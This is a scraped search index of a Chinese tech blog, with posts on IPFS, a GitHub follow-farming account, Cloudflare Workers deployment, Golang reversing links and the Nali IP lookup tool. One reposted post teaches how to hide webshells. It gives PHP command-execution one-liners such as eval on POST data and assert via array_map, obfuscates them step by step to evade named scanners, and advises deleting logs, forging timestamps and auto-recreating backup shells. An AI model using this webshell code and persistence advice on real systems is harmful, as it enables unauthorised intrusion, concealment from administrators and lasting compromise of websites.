机械工业出版社294G原版PDF：/ipfs/QmZYDnPgTRs1MmBx9TPrADFV1K85sPSqLJhAShWayubu9c ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:14:0","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#资源分享"},{"categories":["event"],"content":"下午，还是习惯性的打开GitHub，发现有个没有头像的人Follow我 通常出于礼貌，我会查看对方的个人页和他的仓库，如果感觉不错便会回Follow他 当我打开他的Github个人profile页面，令我惊讶的是他总共follow了59.3k人，而他的followers人数又七百多人 他只Pin了一个仓库，有70多个star，按理说无法吸引如此多数量的followers，这激起了我的好奇，难不成有什么好的内容没有Pin出来？ 先看了一下他的贡献，连续两年都很稀疏，也没有什么突出的贡献量，平平无奇 接下来查看他的仓库，一共有三百五十多个仓库，其中绝大多数都是Fork来的，通过筛选找到他自己的仓库25个 仔细查看这25个项目，除了他pin出来的那个仓库有73个star外，其他的统统都没有或者仅有个位数star 而仓库的内容也没有太有价值的东西，所以几乎可以判断他的follower不是因为有价值的东西而follow的 他Follow了近6万人，star了5千多个项目，结合我自己有回Follow的习惯，看样子这个人的follower大部分都是被骗来的 这个程序员不讲武德。来，骗！我涉世未深的，小同志。这好吗？这不好。 我劝！这位，程序员，耗子尾汁，好好反思。以后不要再犯这样的聪明，小聪明，啊 感兴趣的同学看这里：https://github.com/Lisprez ","date":"2020-11-28","objectID":"https://zu1k.com/posts/events/cheat-for-follow/:0:0","series":null,"tags":["GitHub"],"title":"不讲武德！来骗Follow","uri":"https://zu1k.com/posts/events/cheat-for-follow/#"},{"categories":["coding"],"content":"前几天Cloudflare将Workers KV增加了免费额度，还不得搞起来？ 利用Workers KV存储网页内容，通过Workers将内容返回给用户，就等于将自己的网站直接部署到CF成千上万的边缘节点当中，全球访问速度和TTFB都应该不错 https://blog.cloudflare.com/workers-sites/ ","date":"2020-11-25","objectID":"https://zu1k.com/posts/coding/deploy-blog-to-cf-workers-site/:0:0","series":null,"tags":["Blog","Cloudflare"],"title":"将博客部署到CF Workers Site","uri":"https://zu1k.com/posts/coding/deploy-blog-to-cf-workers-site/#"},{"categories":["coding"],"content":"安装Wrangler 官方文档 Wrangler有两种安装方式，通过NPM或者Cargo安装都可以，任选其一即可 准备好NodeJS和NPM环境，然后执行下面命令，NPM方式是下载预编译好的二进制程序，安装速度比较快 npm i @cloudflare/wrangler -g 或者准备好Rust环境，然后执行下面命令，Cargo方式是在本机从源码编译，安装速度比较慢 cargo install wrangler # 使用系统OpenSSL库，生成的二进制会小一些 cargo install wrangler --features sys-openssl ","date":"2020-11-25","objectID":"https://zu1k.com/posts/coding/deploy-blog-to-cf-workers-site/:1:0","series":null,"tags":["Blog","Cloudflare"],"title":"将博客部署到CF Workers Site","uri":"https://zu1k.com/posts/coding/deploy-blog-to-cf-workers-site/#安装wrangler"},{"categories":["coding"],"content":"部署 我自己博客使用的是Hugo，下面所有内容都是按照Hugo的方式来，其他静态站点生成器方法类似 ","date":"2020-11-25","objectID":"https://zu1k.com/posts/coding/deploy-blog-to-cf-workers-site/:2:0","series":null,"tags":["Blog","Cloudflare"],"title":"将博客部署到CF Workers Site","uri":"https://zu1k.com/posts/coding/deploy-blog-to-cf-workers-site/#部署"},{"categories":["coding"],"content":"登录 wrangler login # 手动设置token wrangler config ","date":"2020-11-25","objectID":"https://zu1k.com/posts/coding/deploy-blog-to-cf-workers-site/:2:1","series":null,"tags":["Blog","Cloudflare"],"title":"将博客部署到CF Workers Site","uri":"https://zu1k.com/posts/coding/deploy-blog-to-cf-workers-site/#登录"},{"categories":["coding"],"content":"初始化 进入自己站点的目录，执行下面命令进行初始化。这里Wrangler会自动安装cargo-generate工具，在本目录下创建一个workers-site项目目录，然后生成一个wrangler.toml配置文件 wrangler init --site 打开wrangler.toml文件，按照自己的信息进行修改 account_id和zone_id都可以从Cloudflare官网上找到，route是路由到Workers的规则，这里写你需要绑定的域名，不要忘记后面的/* bucket是网站的目录，因为我用的是Hugo，所以这个目录默认是public entry-point是部署到Workers的js代码目录，这里不需要修改，因为刚刚初始化的时候生成的项目目录名已经自动填写上了 name = \"blog\" type = \"webpack\" account_id = \"eu5d123456789987456321aabcddgeh\" workers_dev = true route = \"cf.zu1k.com/*\" zone_id = \"fhidag8u98f43h93fhiohr929c8d59efhauh\" [site] bucket = \"public\" entry-point = \"workers-site\" ","date":"2020-11-25","objectID":"https://zu1k.com/posts/coding/deploy-blog-to-cf-workers-site/:2:2","series":null,"tags":["Blog","Cloudflare"],"title":"将博客部署到CF Workers Site","uri":"https://zu1k.com/posts/coding/deploy-blog-to-cf-workers-site/#初始化"},{"categories":["coding"],"content":"预览 wrangler preview --watch ","date":"2020-11-25","objectID":"https://zu1k.com/posts/coding/deploy-blog-to-cf-workers-site/:2:3","series":null,"tags":["Blog","Cloudflare"],"title":"将博客部署到CF Workers Site","uri":"https://zu1k.com/posts/coding/deploy-blog-to-cf-workers-site/#预览"},{"categories":["coding"],"content":"发布 在Cloudflare中增加一条DNS记录，需要打开CF代理 执行下面命令进行部署 wrangler publish ","date":"2020-11-25","objectID":"https://zu1k.com/posts/coding/deploy-blog-to-cf-workers-site/:2:4","series":null,"tags":["Blog","Cloudflare"],"title":"将博客部署到CF Workers Site","uri":"https://zu1k.com/posts/coding/deploy-blog-to-cf-workers-site/#发布"},{"categories":["coding"],"content":"使用Github Actions持续集成 Cloudflare提供了官方的Wrangler GitHub Action，可以直接用Github Actions将博客内容部署到CF Workers Site ","date":"2020-11-25","objectID":"https://zu1k.com/posts/coding/deploy-blog-to-cf-workers-site/:3:0","series":null,"tags":["Blog","Cloudflare"],"title":"将博客部署到CF Workers Site","uri":"https://zu1k.com/posts/coding/deploy-blog-to-cf-workers-site/#使用github-actions持续集成"},{"categories":["coding"],"content":"添加认证信息 在github仓库设置一个secret，名字为CF_API_TOKEN，值为Wrangler的token ","date":"2020-11-25","objectID":"https://zu1k.com/posts/coding/deploy-blog-to-cf-workers-site/:3:1","series":null,"tags":["Blog","Cloudflare"],"title":"将博客部署到CF Workers Site","uri":"https://zu1k.com/posts/coding/deploy-blog-to-cf-workers-site/#添加认证信息"},{"categories":["coding"],"content":"Workflows name: hugo on: push: branches: - master jobs: deploy: runs-on: ubuntu-18.04 steps: - uses: actions/checkout@v2 with: submodules: true fetch-depth: 0 - name: Setup Hugo uses: peaceiris/actions-hugo@v2 with: hugo-version: '0.78.2' extended: true - name: Build run: hugo --minify - name: Deploy uses: peaceiris/actions-gh-pages@v3 with: github_token: ${{ secrets.GITHUB_TOKEN }} publish_dir: ./public - name: Publish uses: cloudflare/wrangler-action@1.3.0 with: apiToken: ${{ secrets.CF_API_TOKEN }} ","date":"2020-11-25","objectID":"https://zu1k.com/posts/coding/deploy-blog-to-cf-workers-site/:3:2","series":null,"tags":["Blog","Cloudflare"],"title":"将博客部署到CF Workers Site","uri":"https://zu1k.com/posts/coding/deploy-blog-to-cf-workers-site/#workflows"},{"categories":["reverse"],"content":"前段时间从逆向xray开始入门Golang逆向，打算深入学习一下Golang逆向方法，这几天看了很多相关的文章，原本想要自己总结一文，但无奈大佬们的总结太全面了，我就直接扔链接吧 ","date":"2020-10-05","objectID":"https://zu1k.com/posts/security/reverse/golang-reverse/:0:0","series":null,"tags":["reverse","Golang"],"title":"Golang逆向资料","uri":"https://zu1k.com/posts/security/reverse/golang-reverse/#"},{"categories":["reverse"],"content":"Go二进制文件逆向分析从基础到进阶 J!4Yu大佬的系列文章太全面了，他写的go_parser相当好用 综述 MetaInfo、函数符号和源码文件路径列表 数据类型 itab与strings Tips与实战案例 ","date":"2020-10-05","objectID":"https://zu1k.com/posts/security/reverse/golang-reverse/:1:0","series":null,"tags":["reverse","Golang"],"title":"Golang逆向资料","uri":"https://zu1k.com/posts/security/reverse/golang-reverse/#go二进制文件逆向分析从基础到进阶"},{"categories":["reverse"],"content":"英文文章 Reversing GO binaries like a pro Bsides-GO-Forth-And-Reverse Reconstructing Program Semantics from Go binaries JEB Analyzing Golang Executables The Go low-level calling convention on x86-64 ","date":"2020-10-05","objectID":"https://zu1k.com/posts/security/reverse/golang-reverse/:2:0","series":null,"tags":["reverse","Golang"],"title":"Golang逆向资料","uri":"https://zu1k.com/posts/security/reverse/golang-reverse/#英文文章"},{"categories":["reverse"],"content":"操作文章和总结 手把手教你如何专业地逆向GO二进制程序 inctf(ultimateGo) Go语言逆向去符号信息还原 无符号Golang程序逆向方法解析 golang语言编译的二进制可执行文件为什么比 C 语言大 Go-逆向学习问题总结 ","date":"2020-10-05","objectID":"https://zu1k.com/posts/security/reverse/golang-reverse/:3:0","series":null,"tags":["reverse","Golang"],"title":"Golang逆向资料","uri":"https://zu1k.com/posts/security/reverse/golang-reverse/#操作文章和总结"},{"categories":["reverse"],"content":"工具和插件 https://github.com/strazzere/golang_loader_assist https://github.com/sibears/IDAGolangHelper https://github.com/0xjiayu/go_parser https://github.com/CarveSystems/gostringsr2 https://github.com/JacobPimental/r2-gohelper https://github.com/sysopfb/GoMang https://github.com/pnfsoftware/jeb-golang-analyzer https://gitlab.com/zaytsevgu/goutils https://gitlab.com/zaytsevgu/GoUtils2.0 ","date":"2020-10-05","objectID":"https://zu1k.com/posts/security/reverse/golang-reverse/:4:0","series":null,"tags":["reverse","Golang"],"title":"Golang逆向资料","uri":"https://zu1k.com/posts/security/reverse/golang-reverse/#工具和插件"},{"categories":["web-security"],"content":" 转自：酒仙桥六号部队 https://mp.weixin.qq.com/s/lExi2_y4NkTak735kpz4ug 这个公众号的文章质量都非常高，推荐大家关注 拿下一个站后总希望自己的后门能够很隐蔽！不让网站管理员或者其他的Hacker发现，网上关于隐藏后门的方法也很多，如加密、包含，解析漏洞、加隐藏系统属性等等，但大部分已经都不实用了，随便找一个查马的程序就能很快的查出来，下面分享我总结的一些经验： ","date":"2020-08-08","objectID":"https://zu1k.com/posts/security/web-security/hide-your-webshell/:0:0","series":null,"tags":["WebShell"],"title":"如何优雅的隐藏你的Webshell","uri":"https://zu1k.com/posts/security/web-security/hide-your-webshell/#"},{"categories":["web-security"],"content":"制作免杀webshell 隐藏webshell最主要的就是做免杀，免杀做好了，你可以把webshell放在函数库文件中或者在图片马中，太多地方可以放了，只要查杀工具查不到，你的这个webshell就能存活很长时间，毕竟管理员也没有那么多精力挨个代码去查看。 ","date":"2020-08-08","objectID":"https://zu1k.com/posts/security/web-security/hide-your-webshell/:1:0","series":null,"tags":["WebShell"],"title":"如何优雅的隐藏你的Webshell","uri":"https://zu1k.com/posts/security/web-security/hide-your-webshell/#制作免杀webshell"},{"categories":["web-security"],"content":"命令执行的方法 这里使用我们最常用的php的一句话马来给大家做演示，PHP版本是5.6的，在写一句话马之前我们来先分析一下PHP执行命令方法 直接执行 使用php函数直接运行命令,常见的函数有(eval、system、assert)等，可以直接调用命令执行。 @eval('echo 这是输出;'); 动态函数执行 我们先把一个函数名当成一个字符串传递给一个变量，在使用变量当作函数去执行 $a=\"phpinfo\";$a(); 文件包含执行 有两个php文件，我们把执行命令的放在文件b中，使用文件a去包含，达到执行的效果 b.php \u003c?php @eval('echo 这是输出;'); a.php \u003c?php include a.php ","date":"2020-08-08","objectID":"https://zu1k.com/posts/security/web-security/hide-your-webshell/:1:1","series":null,"tags":["WebShell"],"title":"如何优雅的隐藏你的Webshell","uri":"https://zu1k.com/posts/security/web-security/hide-your-webshell/#命令执行的方法"},{"categories":["web-security"],"content":"命令执行的方法 这里使用我们最常用的php的一句话马来给大家做演示，PHP版本是5.6的，在写一句话马之前我们来先分析一下PHP执行命令方法 直接执行 使用php函数直接运行命令,常见的函数有(eval、system、assert)等，可以直接调用命令执行。 @eval('echo 这是输出;'); 动态函数执行 我们先把一个函数名当成一个字符串传递给一个变量，在使用变量当作函数去执行 $a=\"phpinfo\";$a(); 文件包含执行 有两个php文件，我们把执行命令的放在文件b中，使用文件a去包含，达到执行的效果 b.php \u003c?php @eval('echo 这是输出;'); a.php \u003c?php include a.php ","date":"2020-08-08","objectID":"https://zu1k.com/posts/security/web-security/hide-your-webshell/:1:1","series":null,"tags":["WebShell"],"title":"如何优雅的隐藏你的Webshell","uri":"https://zu1k.com/posts/security/web-security/hide-your-webshell/#直接执行"},{"categories":["web-security"],"content":"命令执行的方法 这里使用我们最常用的php的一句话马来给大家做演示，PHP版本是5.6的，在写一句话马之前我们来先分析一下PHP执行命令方法 直接执行 使用php函数直接运行命令,常见的函数有(eval、system、assert)等，可以直接调用命令执行。 @eval('echo 这是输出;'); 动态函数执行 我们先把一个函数名当成一个字符串传递给一个变量，在使用变量当作函数去执行 $a=\"phpinfo\";$a(); 文件包含执行 有两个php文件，我们把执行命令的放在文件b中，使用文件a去包含，达到执行的效果 b.php \u003c?php @eval('echo 这是输出;'); a.php \u003c?php include a.php ","date":"2020-08-08","objectID":"https://zu1k.com/posts/security/web-security/hide-your-webshell/:1:1","series":null,"tags":["WebShell"],"title":"如何优雅的隐藏你的Webshell","uri":"https://zu1k.com/posts/security/web-security/hide-your-webshell/#动态函数执行"},{"categories":["web-security"],"content":"命令执行的方法 这里使用我们最常用的php的一句话马来给大家做演示，PHP版本是5.6的，在写一句话马之前我们来先分析一下PHP执行命令方法 直接执行 使用php函数直接运行命令,常见的函数有(eval、system、assert)等，可以直接调用命令执行。 @eval('echo 这是输出;'); 动态函数执行 我们先把一个函数名当成一个字符串传递给一个变量，在使用变量当作函数去执行 $a=\"phpinfo\";$a(); 文件包含执行 有两个php文件，我们把执行命令的放在文件b中，使用文件a去包含，达到执行的效果 b.php \u003c?php @eval('echo 这是输出;'); a.php \u003c?php include a.php ","date":"2020-08-08","objectID":"https://zu1k.com/posts/security/web-security/hide-your-webshell/:1:1","series":null,"tags":["WebShell"],"title":"如何优雅的隐藏你的Webshell","uri":"https://zu1k.com/posts/security/web-security/hide-your-webshell/#文件包含执行"},{"categories":["web-security"],"content":"回调函数 将想要执行命令的函数赋值给一个变量，再用一个可以调用函数执行的函数把变量解析成函数，这么说可能有点绕，看一下array_map函数的用法：array_map函数中将$arr每个元素传给func函数去执行，例子： \u003c?php $func = 'system'; $arr = array('whoami'); array_map($func, $arr); ","date":"2020-08-08","objectID":"https://zu1k.com/posts/security/web-security/hide-your-webshell/:1:2","series":null,"tags":["WebShell"],"title":"如何优雅的隐藏你的Webshell","uri":"https://zu1k.com/posts/security/web-security/hide-your-webshell/#回调函数"},{"categories":["web-security"],"content":"PHP Curly Syntax 我们可以理解为字符串中掺杂了变量，再使用变量去拼接字符串，达到命令执行的效果 \u003c?php $a = 'p'; eval(\"{$a}hpinfo();\"); ","date":"2020-08-08","objectID":"https://zu1k.com/posts/security/web-security/hide-your-webshell/:1:3","series":null,"tags":["WebShell"],"title":"如何优雅的隐藏你的Webshell","uri":"https://zu1k.com/posts/security/web-security/hide-your-webshell/#php-curly-syntax"},{"categories":["web-security"],"content":"php反序列化 这是根据php反序列化漏洞来实现命令执行，可以先创建一个反序列化的漏洞文件，再去调用反序列化函数unserialize \u003c?php class test{ public $a=\"123\"; public function __wakeup(){ eval($this-\u003ea); } } unserialize('O:4:\"test\":1:{s:1:\"a\";s:10:\"phpinfo();\";}'); ","date":"2020-08-08","objectID":"https://zu1k.com/posts/security/web-security/hide-your-webshell/:1:4","series":null,"tags":["WebShell"],"title":"如何优雅的隐藏你的Webshell","uri":"https://zu1k.com/posts/security/web-security/hide-your-webshell/#php反序列化"},{"categories":["web-security"],"content":"php://input方法 php://input可以访问请求的原始数据的只读流，我们可以理解为我们传post参数，php://input会读取到，这时候我们就可以加以利用了。 \u003c?php @eval(file_get_contents('php://input')); ","date":"2020-08-08","objectID":"https://zu1k.com/posts/security/web-security/hide-your-webshell/:1:5","series":null,"tags":["WebShell"],"title":"如何优雅的隐藏你的Webshell","uri":"https://zu1k.com/posts/security/web-security/hide-your-webshell/#phpinput方法"},{"categories":["web-security"],"content":"preg_replace方法 preg_replace函数执行一个正则表达式的搜索和替换。我们可以使用一个命令执行函数去替换正常的字符串，然后去执行命令。 \u003c?php echo preg_replace(\"/test/e\",phpinfo(),\"jutst test\"); ","date":"2020-08-08","objectID":"https://zu1k.com/posts/security/web-security/hide-your-webshell/:1:6","series":null,"tags":["WebShell"],"title":"如何优雅的隐藏你的Webshell","uri":"https://zu1k.com/posts/security/web-security/hide-your-webshell/#preg_replace方法"},{"categories":["web-security"],"content":"ob_start ob_start函数是打开输出控制缓冲，传入的参数会在使用ob_end_flush函数的时候去调用它执行输出在缓冲区的东西。 \u003c?php $cmd = 'system'; ob_start($cmd); echo \"whoami\"; ob_end_flush();//输出全部内容到浏览器 ","date":"2020-08-08","objectID":"https://zu1k.com/posts/security/web-security/hide-your-webshell/:1:7","series":null,"tags":["WebShell"],"title":"如何优雅的隐藏你的Webshell","uri":"https://zu1k.com/posts/security/web-security/hide-your-webshell/#ob_start"},{"categories":["web-security"],"content":"编写免杀 上面说了那么多其实都是一句话木马的思路，每一种方式都可以写成一句话木马，而想要免杀常常会多种组合到一起，下面从最简单的木马一步步变形，达到免杀的目的。 assert($_POST['x']); 这种就是最简单的一句话木马，使用D盾扫一下，可以看到5级，没有什么好说的。 动态函数方法,把assert这个函数赋值两次变量,再把变量当成函数执行。 $c = \"assert\"; $c($_POST['x']); 回调函数方法，把assert函数当作参数传给array_map去调用执行。 \u003c?php $fun = 'assert'; array_map($fun,array($_POST['x'])); 可以看到上面的都是通过两种方法的结合，简单的处理一下，就变成了4级，感兴趣的可以把其他的方法都尝试一下，4级的很简单，我们去看看3级的都是怎么处理的 通过上面的动态函数方法我们可以思考，函数可以当成字符串赋值给变量，那么变量也一定能当成字符串赋值给变量，但调用时需要用$$ \u003c?php $a = \"assert\"; $c ='a'; $$c($_POST['x']); 我们在把这种方法结合到回调函数方法中，可以看到，已经是2级了 \u003c?php $fun = 'assert'; $f = 'fun'; array_map($$f,array($_POST['x'])); 这时候我们看一下D盾中的说明：array_map中的参数可疑，我们这时候可以用函数封装一下参数 \u003c?php function ass(){ $a = \"a451.ass.aaa.ert.adaww\"; $b = explode('.',$a); $c = $b[1] . $b[3]; return $c; } $b = array($_POST['x']); $c = ass(); array_map($c,$b); 1级了，离目标近在咫尺了，这时候我们应该考虑让一句话木马像正常的代码，在好好的封装一下 \u003c?php functiondownloadFile($url,$x){ $ary = parse_url($url); $file = basename($ary['path']); $ext = explode('.',$file); // assert $exec1=substr($ext[0],3,1); $exec2=substr($ext[0],5,1); $exec3=substr($ext[0],5,1); $exec4=substr($ext[0],4,1); $exec5=substr($ext[0],7,2); $as[0] = $exec1 . $exec2 . $exec3 . $exec4 . $exec5; $as[1] = $x; return $as; } $a = $_POST['x']; $s = downloadFile('http://www.baidu.com/asdaesfrtafga.txt',$a); $b = $s[0]; $c = $s[1]; array_map($b,array($c)); 再试试其他免杀工具。 WebShellKiller： 安全狗： 微步云沙箱： 再试试可不可以连接没有问题，完美！！ ","date":"2020-08-08","objectID":"https://zu1k.com/posts/security/web-security/hide-your-webshell/:2:0","series":null,"tags":["WebShell"],"title":"如何优雅的隐藏你的Webshell","uri":"https://zu1k.com/posts/security/web-security/hide-your-webshell/#编写免杀"},{"categories":["web-security"],"content":"更好的隐藏webshell一些建议 拿到权限以后,把网站日志中的所有关于webshell的访问记录和渗透时造成的一些网站报错记录全部删除 把webshell的属性时间改为和同目录文件相同的时间戳,比如linux中的touch就是非常好的工具 目录层级越深越好,平时网站不出问题的话,一般四五级目录很少会被注意到,尽量藏在那些程序员和管理员都不会经常光顾的目录中比如:第三方工具的一些插件目录,主题目录,编辑器的图片目录以及一些临时目录 利用php.ini 配置文件隐藏webshell,把webshell的路径加入到配置文件中 尝试利用静态文件隐藏一句话,然后用.htaccess 规则进行解析 上传个精心构造的图片马,然后再到另一个不起眼的正常的网站脚本文件中去包含这个图片马 靠谱的方法就是直接把一句话插到正常的网站脚本文件里面,当然最好是在一个不起眼的地方,比如:函数库文件,配置文件里面等等,以及那些不需要经常改动的文件 如果有可能的话,还是审计下目标的代码,然后想办法在正常的代码中构造执行我们自己的webshell,即在原生代码中执行webshell webshell里面尽量不要用类似eval这种过于敏感的特征,因为awk一句话就能查出来,除了eval,还有,比如:exec,system,passthru,shell_exec,assert这些函数都最好不要用,你可以尝试写个自定义函数,不仅能在一定程度上延长webshell的存活时间也加大了管理员的查找难度,也可以躲避一些功能比较简陋waf查杀,此外,我们也可以使用一些类似:call_user_func,call_user_func_array,诸如此类的回调函数特性来构造我们的webshell,即伪造正常的函数调用 webshell的名字千万不要太扎眼,比如:hack.php,sb.php,x.php这样的名字严禁出现……,在给webshell起名的时候尽量跟当前目录的,其他文件的名字相似度高一点,这样相对容易混淆视听,比如:目录中有个叫new.php的文件,那你就起个news.php 如果是大马的话,尽量把里面的一些注释和作者信息全部都去掉,比如intitle字段中的版本信息等等,用任何大马之前最好先好好的读几遍代码,把里面的shell箱子地址全部去掉推荐用开源的大马,然后自己拿过来仔细修改,记住,我们的webshell尽量不要用加密,因为加密并不能很好的解决waf问题,还有,大马中一般都会有个pass或者password字符,建议把这些敏感字段全部换成别的,因为利用这样的字符基本一句话就能定位到 养成一个好习惯,为了防止权限很快丢失,最好再同时上传几个备用webshell,注意,每个webshell的路径和名字千万不要都一样更不要在同一个目录下,多跳几层,记住,确定shell正常访问就可以了,不用再去尝试访问看看解析是否正常,因为这样就会在日志中留下记录,容易被查到 当然,如果在拿到服务器权限以后,也可以自己写个脚本每隔一段时间检测下自己的webshell是否还存在,不存在就创建 在有权限的情况,看看管理员是否写的有动态webshell监测脚本,务必把脚本找出来,crontab一般都能看见了 ","date":"2020-08-08","objectID":"https://zu1k.com/posts/security/web-security/hide-your-webshell/:3:0","series":null,"tags":["WebShell"],"title":"如何优雅的隐藏你的Webshell","uri":"https://zu1k.com/posts/security/web-security/hide-your-webshell/#更好的隐藏webshell一些建议"},{"categories":["coding"],"content":"Nali 一个查询IP地理信息和CDN提供商的离线终端工具 ","date":"2020-07-17","objectID":"https://zu1k.com/posts/coding/nali-golang/:0:0","series":null,"tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://zu1k.com/posts/coding/nali-golang/#"},{"categories":["coding"],"content":"来源 该工具受 Nali C版本 和 nali-cli js版本 的启发. 我想要在终端对IP地理信息和CDN服务提供商进行查询，发现了Nali这个工具，Nali与哪里谐音，非常适合这类工具 经过简单的使用，我发现最初的C语言版本功能缺失，而苏卡卡大佬的js版本包实在大的恐怖、而支持的平台非常有限，所以我用golang重写了这个工具，在原有功能的基础上增加了对IPv6的支持，并且增加了Geoip2数据库 ","date":"2020-07-17","objectID":"https://zu1k.com/posts/coding/nali-golang/:1:0","series":null,"tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://zu1k.com/posts/coding/nali-golang/#来源"},{"categories":["coding"],"content":"功能 纯真 IPv4 离线数据库 ZX IPv6 离线数据库 Geoip2 城市数据库 (可选) IPIP 数据库 (可选) CDN 服务提供商查询 支持管道处理 支持交互式查询 同时支持IPv4和IPv6 查询完全离线 全平台支持 ","date":"2020-07-17","objectID":"https://zu1k.com/posts/coding/nali-golang/:2:0","series":null,"tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://zu1k.com/posts/coding/nali-golang/#功能"},{"categories":["coding"],"content":"安装 ","date":"2020-07-17","objectID":"https://zu1k.com/posts/coding/nali-golang/:3:0","series":null,"tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://zu1k.com/posts/coding/nali-golang/#安装"},{"categories":["coding"],"content":"从源码安装 Nali 需要预先安装 Go. 安装后可以从源码安装软件: $ go get -u -v github.com/zu1k/nali ","date":"2020-07-17","objectID":"https://zu1k.com/posts/coding/nali-golang/:3:1","series":null,"tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://zu1k.com/posts/coding/nali-golang/#从源码安装"},{"categories":["coding"],"content":"下载预编译的可执行程序 可以从Release页面下载预编译好的可执行程序: Release 你需要选择适合你系统和硬件架构的版本下载，解压后可直接运行 ","date":"2020-07-17","objectID":"https://zu1k.com/posts/coding/nali-golang/:3:2","series":null,"tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://zu1k.com/posts/coding/nali-golang/#下载预编译的可执行程序"},{"categories":["coding"],"content":"使用 Docker 版本 docker pull docker.pkg.github.com//zu1k/nali/nali:latest ","date":"2020-07-17","objectID":"https://zu1k.com/posts/coding/nali-golang/:3:3","series":null,"tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://zu1k.com/posts/coding/nali-golang/#使用-docker-版本"},{"categories":["coding"],"content":"使用说明 ","date":"2020-07-17","objectID":"https://zu1k.com/posts/coding/nali-golang/:4:0","series":null,"tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://zu1k.com/posts/coding/nali-golang/#使用说明"},{"categories":["coding"],"content":"查询一个IP的地理信息 $ nali 1.2.3.4 1.2.3.4 [澳大利亚 APNIC Debogon-prefix网络] 或者 使用 管道 $ echo IP 6.6.6.6 | nali IP 6.6.6.6 [美国 亚利桑那州华楚卡堡市美国国防部网络中心] ","date":"2020-07-17","objectID":"https://zu1k.com/posts/coding/nali-golang/:4:1","series":null,"tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://zu1k.com/posts/coding/nali-golang/#查询一个ip的地理信息"},{"categories":["coding"],"content":"查询一个IP的地理信息 $ nali 1.2.3.4 1.2.3.4 [澳大利亚 APNIC Debogon-prefix网络] 或者 使用 管道 $ echo IP 6.6.6.6 | nali IP 6.6.6.6 [美国 亚利桑那州华楚卡堡市美国国防部网络中心] ","date":"2020-07-17","objectID":"https://zu1k.com/posts/coding/nali-golang/:4:1","series":null,"tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://zu1k.com/posts/coding/nali-golang/#或者-使用-管道"},{"categories":["coding"],"content":"同时查询多个IP的地理信息 $ nali 1.2.3.4 4.3.2.1 123.23.3.0 1.2.3.4 [澳大利亚 APNIC Debogon-prefix网络] 4.3.2.1 [美国 新泽西州纽瓦克市Level3Communications] 123.23.3.0 [越南 越南邮电集团公司] ","date":"2020-07-17","objectID":"https://zu1k.com/posts/coding/nali-golang/:4:2","series":null,"tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://zu1k.com/posts/coding/nali-golang/#同时查询多个ip的地理信息"},{"categories":["coding"],"content":"交互式查询 使用 exit 或 quit 退出查询 $ nali 123.23.23.23 123.23.23.23 [越南 越南邮电集团公司] 1.0.0.1 1.0.0.1 [美国 APNIC\u0026CloudFlare公共DNS服务器] 8.8.8.8 8.8.8.8 [美国 加利福尼亚州圣克拉拉县山景市谷歌公司DNS服务器] quit ","date":"2020-07-17","objectID":"https://zu1k.com/posts/coding/nali-golang/:4:3","series":null,"tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://zu1k.com/posts/coding/nali-golang/#交互式查询"},{"categories":["coding"],"content":"与 dig 命令配合使用 需要你系统中已经安装好 dig 程序 $ dig nali.zu1k.com +short | nali 104.28.2.115 [美国 CloudFlare公司CDN节点] 104.28.3.115 [美国 CloudFlare公司CDN节点] 172.67.135.48 [美国 CloudFlare节点] ","date":"2020-07-17","objectID":"https://zu1k.com/posts/coding/nali-golang/:4:4","series":null,"tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://zu1k.com/posts/coding/nali-golang/#与-dig-命令配合使用"},{"categories":["coding"],"content":"与 nslookup 命令配合使用 需要你系统中已经安装好 nslookup 程序 $ nslookup nali.zu1k.com 8.8.8.8 | nali Server: 8.8.8.8 [美国 加利福尼亚州圣克拉拉县山景市谷歌公司DNS服务器] Address: 8.8.8.8 [美国 加利福尼亚州圣克拉拉县山景市谷歌公司DNS服务器]#53 Non-authoritative answer: Name: nali.zu1k.com Address: 104.28.3.115 [美国 CloudFlare公司CDN节点] Name: nali.zu1k.com Address: 104.28.2.115 [美国 CloudFlare公司CDN节点] Name: nali.zu1k.com Address: 172.67.135.48 [美国 CloudFlare节点] ","date":"2020-07-17","objectID":"https://zu1k.com/posts/coding/nali-golang/:4:5","series":null,"tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://zu1k.com/posts/coding/nali-golang/#与-nslookup-命令配合使用"},{"categories":["coding"],"content":"与任意程序配合使用 因为 nali 支持管道处理，所以可以和任意程序配合使用 bash abc.sh | nali Nali 将在 IP后面插入IP地理信息，CDN域名后面插入CDN服务提供商信息 ","date":"2020-07-17","objectID":"https://zu1k.com/posts/coding/nali-golang/:4:6","series":null,"tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://zu1k.com/posts/coding/nali-golang/#与任意程序配合使用"},{"categories":["coding"],"content":"支持IPv6 和 IPv4 用法完全相同 $ nslookup google.com | nali Server: 127.0.0.53 [局域网 IP] Address: 127.0.0.53 [局域网 IP]#53 Non-authoritative answer: Name: google.com Address: 216.58.211.110 [美国 Google全球边缘网络] Name: google.com Address: 2a00:1450:400e:809::200e [荷兰Amsterdam Google Inc. 服务器网段] ","date":"2020-07-17","objectID":"https://zu1k.com/posts/coding/nali-golang/:4:7","series":null,"tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://zu1k.com/posts/coding/nali-golang/#支持ipv6"},{"categories":["coding"],"content":"查询 CDN 服务提供商 因为 CDN 服务通常使用 CNAME 的域名解析方式，所以推荐与 nslookup 或者 dig 配合使用，在已经知道 CNAME 后可单独使用 只查询 CDN 服务提供商 $ nslookup www.gov.cn | nali cdn Server: 127.0.0.53 Address: 127.0.0.53#53 Non-authoritative answer: www.gov.cn canonical name = www.gov.cn.bsgslb.cn [白山云 CDN]. 